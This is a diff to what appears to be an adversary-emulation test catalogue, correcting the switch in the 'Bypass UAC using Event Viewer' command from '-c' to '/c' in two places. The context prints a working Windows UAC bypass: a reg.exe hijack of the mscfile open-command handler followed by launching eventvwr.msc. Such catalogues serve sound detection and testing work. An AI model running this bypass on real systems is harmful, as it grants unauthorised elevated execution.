@@ -4209,7 +4209,7 @@ defense-evasion:
         name: command_prompt
         command: |
           reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f
-          cmd.exe -c eventvwr.msc
+          cmd.exe /c eventvwr.msc
     - name: Bypass UAC using Event Viewer - PowerShell
       description: 'PowerShell code to bypass User Account Control using Event Viewer
         and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
@@ -9592,7 +9592,7 @@ privilege-escalation:
         name: command_prompt
         command: |
           reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f
-          cmd.exe -c eventvwr.msc
+          cmd.exe /c eventvwr.msc
     - name: Bypass UAC using Event Viewer - PowerShell
       description: 'PowerShell code to bypass User Account Control using Event Viewer
         and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
